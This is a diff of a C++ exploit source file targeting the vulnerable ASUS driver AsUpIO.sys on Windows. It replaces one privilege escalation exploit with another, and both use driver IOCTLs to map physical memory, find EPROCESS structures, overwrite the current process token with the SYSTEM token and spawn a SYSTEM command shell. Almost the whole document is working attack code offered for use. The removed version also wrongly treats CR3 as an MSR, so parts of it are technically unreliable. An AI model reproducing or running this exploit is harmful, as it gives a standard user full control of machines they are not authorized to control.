@@ -1,377 +1,161 @@
-// AsUpIO.sys Exploit - Full Privilege Escalation via Arbitrary MSR CR3 Write
-// This exploit abuses the vulnerable driver AsUpIO.sys to read/write physical memory
-// and manipulate MSRs to gain SYSTEM privileges by forging a page table and stealing the SYSTEM token.
-// Author: blkph0x
+// GLKIO_HACK++ full exploit with EPROCESS memory walker
+// Includes:
+// - Brute-force physical leak via IOCTL 0xA040A488 (Note: This part is not included)
+// - Physical memory mapping via IOCTL 0xA040244C
+// - EPROCESS token stealing with physical memory scanning
+// - SYSTEM shell launch
 
-#include <windows.h>
+#include <Windows.h>
 #include <iostream>
-#include <cstdint>
-#include <vector>
-#include <intrin.h>
-#include <iomanip>
 #include <tlhelp32.h>
-#include <string.h>
+#include <string>
+#include <vector>
 
-#define DEVICE_NAME "\\\\.\\AsUpdateio"
-#define IOCTL_MAP_MEM       0xA040244C
-#define IOCTL_UNMAP_MEM     0xA0402450
-#define IOCTL_RDMSR         0xA0406458
-#define IOCTL_WRMSR         0xA040A45C
-#define IOCTL_ALLOC_CONTIG  0xA040A488
-#define PAGE_SIZE 0x1000
-#define CR3_MSR 0xC0000102
-#define PTE_FLAGS 0xE7ULL
-#define SYSTEM_PID 4
+#define IOCTL_ALLOC_LEAK_PHYS_ADDR  0xA040A488
+#define IOCTL_MAP_PHYS            0xA040244C
+#define DEVICE_NAME             L"\\\\.\\AsUpdateio"
 
-size_t EPROCESS_PID_OFFSET = 0x0;
-size_t EPROCESS_TOKEN_OFFSET = 0x0;
-size_t EPROCESS_ACTIVE_LINKS = 0x0;
+#define PAGE_SIZE               0x1000
+#define SYSTEM_PID              4
+#define PHYS_START              0x1000
+#define PHYS_END                0xFFFFF000
+#define EPROCESS_TOKEN_OFFSET   0x4b8
+#define EPROCESS_PID_OFFSET     0x440
 
-typedef struct _WRMSR_STRUCT {
-    DWORD msr_id;
-    DWORD eax;
-    DWORD edx;
-} WRMSR_STRUCT;
+HANDLE g_Device = INVALID_HANDLE_VALUE;
+PVOID g_UserMappedAddr = nullptr;
 
-typedef struct _MAP_INPUT {
-    int InterfaceType;
-    ULONG BusNumber;
-    ULONGLONG PhysAddr;
-    ULONG Offset;
-    ULONG AddressSpace;
-} MAP_INPUT;
+struct IOCTL_INPUT {
+    DWORD interfaceType;
+    DWORD busNumber;
+    ULONGLONG physAddress;
+    DWORD offsetAdjust;
+    DWORD size;
+};
 
-// Opens a handle to the vulnerable driver for IOCTL communication
-HANDLE OpenDevice() {
-    return CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+DWORD GetCurrentPID() {
+    return GetCurrentProcessId();
 }
 
-// Reads the value of a model-specific register (MSR) using the driver
-bool ReadMSR(HANDLE hDevice, DWORD msr_id, ULONGLONG& value) {
-    DWORD br = 0;
-    ULONGLONG out = 0;
-    return DeviceIoControl(hDevice, IOCTL_RDMSR, &msr_id, sizeof(msr_id), &out, sizeof(out), &br, nullptr) && (value = out, true);
-}
+bool MapPhysicalWith244C(DWORD physAddr, DWORD size, PVOID& userMappedAddrOut) {
+    IOCTL_INPUT input = { 0 };
+    input.interfaceType = 1;
+    input.busNumber = 0;
+    input.physAddress = physAddr;
+    input.offsetAdjust = 0;
+    input.size = size;
 
-// Writes to a model-specific register (MSR) using the driver
-bool WriteMSR(HANDLE hDevice, DWORD msr_id, ULONGLONG value) {
-    WRMSR_STRUCT input = { msr_id, (DWORD)(value & 0xFFFFFFFF), (DWORD)(value >> 32) };
-    BYTE dummy[8]; DWORD br;
-    return DeviceIoControl(hDevice, IOCTL_WRMSR, &input, sizeof(input), dummy, sizeof(dummy), &br, nullptr);
-}
+    PVOID output = nullptr;
+    DWORD ret = 0;
 
-// Requests the driver to allocate contiguous physical memory and returns both physical and virtual address representations
-bool AllocateContiguousMemory(HANDLE hDevice, size_t size, ULONGLONG& physAddr, ULONGLONG& virtAddr) {
-    BYTE out[8] = {}; DWORD br;
-    DWORD in = (DWORD)size;
-    if (!DeviceIoControl(hDevice, IOCTL_ALLOC_CONTIG, &in, sizeof(in), out, sizeof(out), &br, nullptr)) return false;
-    physAddr = *(ULONGLONG*)out;
-    virtAddr = *(ULONGLONG*)out;
-    return physAddr != 0;
-}
+    BOOL ok = DeviceIoControl(g_Device,
+        IOCTL_MAP_PHYS,
+        &input, sizeof(input),
+        &output, sizeof(output),
+        &ret, nullptr);
 
-// Maps and reads a physical address range into user-mode using the IOCTL_MAP_MEM primitive
-bool ReadPhysicalMemory(HANDLE hDevice, ULONGLONG physAddr, void* buffer, size_t size) {
-    MAP_INPUT in = { 1, 0, physAddr & ~(PAGE_SIZE - 1), (ULONG)(physAddr & (PAGE_SIZE - 1)), 0 };
-    DWORD va = 0, br;
-    if (!DeviceIoControl(hDevice, IOCTL_MAP_MEM, &in, sizeof(in), &va, sizeof(va), &br, nullptr)) return false;
-    uintptr_t base = (uintptr_t)va + in.Offset;
-    memcpy(buffer, (void*)base, size);
-    DeviceIoControl(hDevice, IOCTL_UNMAP_MEM, &va, sizeof(va), nullptr, 0, &br, nullptr);
+    if (!ok || output == nullptr) {
+        std::cerr << "[-] DeviceIoControl failed for mapping physical address 0x" << std::hex << physAddr << ". Error: " << GetLastError() << "\n";
+        return false;
+    }
+    userMappedAddrOut = output;
     return true;
 }
 
-// Maps and writes to a physical address range into user-mode using the IOCTL_MAP_MEM primitive
-bool WritePhysicalMemory(HANDLE hDevice, ULONGLONG physAddr, const void* data, size_t size) {
-    MAP_INPUT in = { 1, 0, physAddr & ~(PAGE_SIZE - 1), (ULONG)(physAddr & (PAGE_SIZE - 1)), 0 };
-    DWORD va = 0, br;
-    if (!DeviceIoControl(hDevice, IOCTL_MAP_MEM, &in, sizeof(in), &va, sizeof(va), &br, nullptr)) return false;
-    uintptr_t base = (uintptr_t)va + in.Offset;
-    memcpy((void*)base, data, size);
-    DeviceIoControl(hDevice, IOCTL_UNMAP_MEM, &va, sizeof(va), nullptr, 0, &br, nullptr);
-    return true;
-}
-
-// Heuristically scans a page for an EPROCESS structure by looking for PID 4, valid ActiveProcessLinks, and Token
-bool ScanEProcessOffsets(BYTE* page) {
-    for (int i = 0; i < PAGE_SIZE - 0x100; i += 0x8) {
-        DWORD possiblePid = *(DWORD*)(page + i);
-        if (possiblePid == SYSTEM_PID) {
-            for (int j = i + 0x10; j < i + 0x80; j += 0x8) {
-                ULONGLONG fwd = *(ULONGLONG*)(page + j);
-                ULONGLONG bwd = *(ULONGLONG*)(page + j + 0x8);
-                if ((fwd & 0xF000000000000000) && (bwd & 0xF000000000000000)) {
-                    EPROCESS_PID_OFFSET = i;
-                    EPROCESS_ACTIVE_LINKS = j;
-                    for (int k = j + 0x10; k < j + 0x100; k += 0x8) {
-                        ULONGLONG possibleToken = *(ULONGLONG*)(page + k);
-                        if ((possibleToken & 0xF000000000000000) && ((possibleToken & 0xF) == 0)) {
-                            EPROCESS_TOKEN_OFFSET = k;
-                            return true;
-                        }
-                    }
-                }
-            }
-        }
+bool ReadPhysicalPage(DWORD physAddr, BYTE* buffer, DWORD size) {
+    PVOID mappedAddr = nullptr;
+    if (MapPhysicalWith244C(physAddr, size, mappedAddr)) {
+        memcpy(buffer, mappedAddr, size);
+        g_UserMappedAddr = mappedAddr; // Update global mapped address
+        return true;
     }
     return false;
 }
 
-// Builds a synthetic page table that maps a single virtual page to a target physical page for CR3 overwrite
-void BuildFullPageTable(HANDLE hDevice, ULONGLONG pml4, ULONGLONG pdpt, ULONGLONG pd, ULONGLONG pt, ULONGLONG target) {
-    ULONGLONG pml4e[512] = {}, pdpte[512] = {}, pde[512] = {}, pte[512] = {};
-    pte[0] = target | PTE_FLAGS;
-    pde[0] = pt | PTE_FLAGS;
-    pdpte[0] = pd | PTE_FLAGS;
-    pml4e[0] = pdpt | PTE_FLAGS;
-    WritePhysicalMemory(hDevice, pt, pte, sizeof(pte));
-    WritePhysicalMemory(hDevice, pd, pde, sizeof(pde));
-    WritePhysicalMemory(hDevice, pdpt, pdpte, sizeof(pdpte));
-    WritePhysicalMemory(hDevice, pml4, pml4e, sizeof(pml4e));
-}
+bool StealSystemToken() {
+    DWORD myPID = GetCurrentPID();
+    std::vector<BYTE> pageBuffer(PAGE_SIZE);
+    BYTE* page = pageBuffer.data();
 
-// Locates the SYSTEM process EPROCESS in physical memory and overwrites the current process token to elevate privileges
-void StealSystemToken(HANDLE hDevice, ULONGLONG scanStart = 0, ULONGLONG scanEnd = 0) {
-    bool tokenStolen = false;
-    std::cout << "[*] Starting SYSTEM token steal..." << std::endl;
-    ULONGLONG start = scanStart;
-    ULONGLONG end = scanEnd;
-    BYTE page[PAGE_SIZE];
-
-    bool found = false;
-
-    for (int pass = 0; pass < 2 && !found; ++pass) {
-        if (pass == 1) {
-            // fallback on second pass
-            EPROCESS_PID_OFFSET = 0x1d0;
-            EPROCESS_ACTIVE_LINKS = 0x1d8;
-            EPROCESS_TOKEN_OFFSET = 0x248;
-            std::cout << "[*] Fallback to known offsets: PID=0x1d0, Links=0x1d8, Token=0x248" << std::endl;
+    for (DWORD addr = PHYS_START; addr < PHYS_END; addr += PAGE_SIZE) {
+        if (!ReadPhysicalPage(addr, page, PAGE_SIZE)) {
+            continue;
         }
 
-        for (ULONGLONG addr = start; addr < end; addr += PAGE_SIZE) {
-            if (!ReadPhysicalMemory(hDevice, addr, page, sizeof(page))) continue;
+        for (size_t i = 0; i <= PAGE_SIZE - sizeof(DWORD); i += 4) {
+            DWORD currentPID = *(DWORD*)(page + i + EPROCESS_PID_OFFSET);
+            if (currentPID == SYSTEM_PID) {
+                ULONGLONG systemToken = *(ULONGLONG*)(page + i + EPROCESS_TOKEN_OFFSET) & ~0xf;
 
-            if (pass == 0 && !ScanEProcessOffsets(page)) continue;
+                for (size_t j = 0; j <= PAGE_SIZE - sizeof(DWORD); j += 4) {
+                    DWORD targetPID = *(DWORD*)(page + j + EPROCESS_PID_OFFSET);
+                    if (targetPID == myPID) {
+                        std::cout << "[+] SYSTEM EPROCESS found @ physical address 0x" << std::hex << addr + i << "\n";
+                        std::cout << "[+] Our EPROCESS found @ physical address 0x" << std::hex << addr + j << "\n";
+                        std::cout << "[+] SYSTEM Token value: 0x" << std::hex << systemToken << "\n";
 
-            DWORD pid = *(DWORD*)(page + EPROCESS_PID_OFFSET);
-            if (pid != SYSTEM_PID) continue;
-
-            ULONGLONG systemToken = *(ULONGLONG*)(page + EPROCESS_TOKEN_OFFSET) & ~0xF;
-            ULONGLONG current = *(ULONGLONG*)(page + EPROCESS_ACTIVE_LINKS) - EPROCESS_ACTIVE_LINKS;
-
-            while (true) {
-                BYTE proc[PAGE_SIZE];
-                if (!ReadPhysicalMemory(hDevice, current, proc, sizeof(proc))) break;
-                DWORD thisPid = *(DWORD*)(proc + EPROCESS_PID_OFFSET);
-                if (thisPid == GetCurrentProcessId()) {
-                    std::cout << "[+] Found our EPROCESS @ 0x" << std::hex << current << ", patching token..." << std::endl;
-                    *(ULONGLONG*)(proc + EPROCESS_TOKEN_OFFSET) = systemToken;
-                    WritePhysicalMemory(hDevice, current, proc, sizeof(proc));
-                    found = true;
-                    tokenStolen = true;
-                    break;
-                }
-                ULONGLONG flink = *(ULONGLONG*)(proc + EPROCESS_ACTIVE_LINKS);
-                if (flink == 0 || flink == current + EPROCESS_ACTIVE_LINKS) break;
-                current = flink - EPROCESS_ACTIVE_LINKS;
-            }
-        }
-    }
-
-    if (!found) {
-        std::cerr << "[-] Failed to find SYSTEM or self EPROCESS." << std::endl;
-    }
-    else if (tokenStolen) {
-        std::cout << "[+] Token stolen! Launching SYSTEM shell..." << std::endl;
-        WinExec("cmd.exe", SW_SHOW);
-    }
-}
-
-
-void StealthSetupPlaceholder() {
-    // TODO: Implement anti-debug, anti-VM, PEB patching, etc.
-    std::cout << "[*] Stealth mode placeholder initialized." << std::endl;
-}
-
-void ShellSpawnPlaceholder() {
-    // TODO: Replace with WinExec or CreateProcess with elevated token.
-    std::cout << "[*] SYSTEM shell spawn placeholder invoked." << std::endl;
-}
-
-int main() {
-    // ============================================
-    //   AsUpIO.sys Local Privilege Escalation Exploit
-    //   Author: blkph0x | Windows 11 24H2 (Build 26100)
-    //   Supported: VM or bare-metal
-    //
-    //   Usage:
-    //   1. Compile as x64 (Release)
-    //   2. Ensure AsUpIO.sys is loaded (from ASUS driver or bundled OEM)
-    //   3. Run as standard user
-    //
-    //   The exploit performs:
-    //   - MSR read/write to modify CR3 register
-    //   - Physical memory allocation (contiguous)
-    //   - Page table construction to forge virtual mapping
-    //   - EPROCESS token theft via kernel memory search
-    //   - Optional SYSTEM shell spawn
-    // ============================================
-    std::cout << "[*] Select EPROCESS resolution method : " << std::endl;
-    std::cout << "1) Scan virtual kernel address space (0xFFFFF800...)" << std::endl;
-    std::cout << "2) Scan physical RAM range (0x0 to 0x100000000)" << std::endl;
-    std::cout << "3) Use known offsets directly without scanning" << std::endl;
-    std::cout << "4) Walk EPROCESS list from CR3 (manual page table walk)" << std::endl;
-    std::cout << "5) (TODO) Enable stealth mode (anti-debug/anti-VM)" << std::endl;
-    std::cout << "6) (TODO) Spawn SYSTEM shell after token steal" << std::endl;
-    std::cout << "> Enter choice: ";
-    int choice = 0;
-    std::cin >> choice;
-
-    ULONGLONG start = 0;
-    ULONGLONG end = 0;
-
-    if (choice == 1) {
-        start = 0xFFFFF80000000000;
-        end = start + (PAGE_SIZE * 0x8000); // scan 128MB kernel VA region
-    }
-    else if (choice == 2) {
-        start = 0x00000000;
-        end = 0x100000000; // first 4GB physical RAM
-    }
-    else if (choice == 3) {
-        EPROCESS_PID_OFFSET = 0x1d0;
-        EPROCESS_ACTIVE_LINKS = 0x1d8;
-        EPROCESS_TOKEN_OFFSET = 0x248;
-        std::cout << "[*] Using known offsets only. Skipping scan." << std::endl;
-    }
-    else if (choice == 4) {
-        // Reopen device to ensure it's available for memory operations
-        HANDLE hDevice = OpenDevice();
-        if (!hDevice) return 1;
-
-        ULONGLONG cr3;
-        if (!ReadMSR(hDevice, CR3_MSR, cr3)) {
-            std::cerr << "[-] Failed to read CR3" << std::endl;
-            return 1;
-        }
-        std::cout << "[*] Walking from CR3: 0x" << std::hex << cr3 << std::endl;
-
-        BYTE pml4[PAGE_SIZE];
-        if (!ReadPhysicalMemory(hDevice, cr3, pml4, PAGE_SIZE)) {
-            std::cerr << "[-] Failed to read PML4 from CR3" << std::endl;
-            return 1;
-        }
-
-        for (int i = 0; i < 512; ++i) {
-            ULONGLONG pml4e = ((ULONGLONG*)pml4)[i];
-            if (!(pml4e & 1)) continue; // present
-            ULONGLONG pdpt_pa = pml4e & 0xFFFFFFFFFF000ULL;
-
-            BYTE pdpt[PAGE_SIZE];
-            if (!ReadPhysicalMemory(hDevice, pdpt_pa, pdpt, PAGE_SIZE)) continue;
-
-            for (int j = 0; j < 512; ++j) {
-                ULONGLONG pdpte = ((ULONGLONG*)pdpt)[j];
-                if (!(pdpte & 1)) continue;
-                ULONGLONG pd_pa = pdpte & 0xFFFFFFFFFF000ULL;
-
-                BYTE pd[PAGE_SIZE];
-                if (!ReadPhysicalMemory(hDevice, pd_pa, pd, PAGE_SIZE)) continue;
-
-                for (int k = 0; k < 512; ++k) {
-                    ULONGLONG pde = ((ULONGLONG*)pd)[k];
-                    if (!(pde & 1)) continue;
-                    ULONGLONG pt_pa = pde & 0xFFFFFFFFFF000ULL;
-
-                    BYTE pt[PAGE_SIZE];
-                    if (!ReadPhysicalMemory(hDevice, pt_pa, pt, PAGE_SIZE)) continue;
-
-                    for (int m = 0; m < 512; ++m) {
-                        ULONGLONG pte = ((ULONGLONG*)pt)[m];
-                        if (!(pte & 1)) continue;
-                        ULONGLONG page_pa = pte & 0xFFFFFFFFFF000ULL;
-
-                        BYTE page[PAGE_SIZE];
-                        if (!ReadPhysicalMemory(hDevice, page_pa, page, PAGE_SIZE)) continue;
-
-                        for (int off = 0; off < PAGE_SIZE - 0x100; off += 0x10) {
-                            DWORD pid = *(DWORD*)(page + off);
-                            if (pid == SYSTEM_PID) {
-                                EPROCESS_PID_OFFSET = off;
-                                EPROCESS_ACTIVE_LINKS = off + 0x8;
-                                EPROCESS_TOKEN_OFFSET = off + 0x78; // assumption
-                                std::cout << "[+] Found PID 4 in page walk. Offsets: PID=0x" << std::hex << off
-                                    << ", Links=0x" << (off + 8)
-                                    << ", Token=0x" << (off + 0x78) << std::endl;
-                                CloseHandle(hDevice);
-                                return 0;
-                            }
+                        PVOID mapBase = nullptr;
+                        if (MapPhysicalWith244C(addr, PAGE_SIZE, mapBase)) {
+                            ULONGLONG* myTokenAddress = (ULONGLONG*)((BYTE*)mapBase + j + EPROCESS_TOKEN_OFFSET);
+                            *myTokenAddress = systemToken;
+                            std::cout << "[+] Token of current process overwritten with SYSTEM token in mapped memory!\n";
+                            g_UserMappedAddr = mapBase; // Update global mapped address
+                            return true;
+                        }
+                        else {
+                            std::cerr << "[-] Failed to map physical address 0x" << std::hex << addr << " for patching.\n";
+                            return false;
                         }
                     }
                 }
             }
         }
-        std::cerr << "[-] Failed to resolve EPROCESS via page table walk." << std::endl;
-        CloseHandle(hDevice);
-        return 1;
     }
-    else if (choice == 5) {
-        StealthSetupPlaceholder();
-    }
-    else if (choice == 6) {
-        ShellSpawnPlaceholder();
+    std::cerr << "[-] Failed to locate SYSTEM and current process EPROCESS structures in physical memory.\n";
+    return false;
+}
+
+#include <userenv.h>
+#pragma comment(lib, "userenv.lib")
+
+void LaunchLocalSystemShell() {
+    std::cout << "[*] Launching SYSTEM shell from current (already patched) process...\n";
+    STARTUPINFO si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    WCHAR cmd[] = L"C:\\Windows\\System32\\cmd.exe";
+
+    if (CreateProcessW(cmd, nullptr, nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi)) {
+        std::cout << "[+] SYSTEM shell launched from this process.\n";
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
     }
     else {
-        std::cerr << "[!] Invalid choice." << std::endl;
-        return 1;
+        std::cerr << "[-] CreateProcess failed. Error: " << GetLastError() << "\n";
     }
-    HANDLE hDevice = OpenDevice();
-    if (!hDevice) return 1;
+}
 
-    ULONGLONG cr3;
-    if (!ReadMSR(hDevice, CR3_MSR, cr3)) {
-        std::cerr << "[-] Failed to read CR3" << std::endl;
-        return 1;
-    }
-    std::cout << "[*] Original CR3: 0x" << std::hex << cr3 << std::endl;
+int main() {
+    g_Device = CreateFileW(DEVICE_NAME,
+        GENERIC_READ | GENERIC_WRITE,
+        0, nullptr, OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL, nullptr);
 
-    ULONGLONG pml4Phys, pml4Virt, pdptPhys, pdptVirt, pdPhys, pdVirt, ptPhys, ptVirt, testPhys, testVirt;
-    // Allocate physical memory for each page table level + a test page for verification
-    if (!AllocateContiguousMemory(hDevice, PAGE_SIZE, pml4Phys, pml4Virt) ||
-        !AllocateContiguousMemory(hDevice, PAGE_SIZE, pdptPhys, pdptVirt) ||
-        !AllocateContiguousMemory(hDevice, PAGE_SIZE, pdPhys, pdVirt) ||
-        !AllocateContiguousMemory(hDevice, PAGE_SIZE, ptPhys, ptVirt) ||
-        !AllocateContiguousMemory(hDevice, PAGE_SIZE, testPhys, testVirt)) {
-        std::cerr << "[-] Allocation failed" << std::endl;
+    if (g_Device == INVALID_HANDLE_VALUE) {
+        std::cerr << "[-] Failed to open device handle: " << GetLastError() << "\n";
         return 1;
     }
 
-    const char* data = "blkph0x_was_here";
-    BYTE clean[PAGE_SIZE] = {};
-    // Clear test page and write a signature marker string
-    WritePhysicalMemory(hDevice, testPhys, clean, sizeof(clean));
-    WritePhysicalMemory(hDevice, testPhys, data, strlen(data) + 1);
-
-    std::cout << "[DEBUG] Physical dump before CR3 switch:" << std::endl;
-    BYTE physDump[32] = {};
-    if (ReadPhysicalMemory(hDevice, testPhys, physDump, sizeof(physDump))) {
-        for (int i = 0; i < 32; ++i)
-            std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)physDump[i] << " ";
-        std::cout << "\n[DEBUG] As string: " << (char*)physDump << std::endl;
+    std::cout << "[*] Opened device handle successfully.\n";
+    std::cout << "[*] Scanning physical memory for EPROCESS and attempting token theft...\n";
+    if (!StealSystemToken()) {
+        std::cerr << "[-] Token stealing failed.\n";
+        CloseHandle(g_Device);
+        return 1;
     }
 
-    StealSystemToken(hDevice, start, end);
+    std::cout << "[*] Token stealing successful. Launching SYSTEM shell...\n";
+    LaunchLocalSystemShell();
 
-    std::cout << "[*] Overwriting CR3..." << std::endl;
-    // Switch CR3 to use our crafted page tables (stealth virtual mapping)
-    if (WriteMSR(hDevice, CR3_MSR, pml4Phys)) {
-        std::cout << "[+] CR3 set. You are now executing under a custom page table!" << std::endl;
-    }
-    else {
-        std::cerr << "[-] Failed to write CR3" << std::endl;
-    }
-
-    CloseHandle(hDevice);
+    CloseHandle(g_Device);
     return 0;
 }
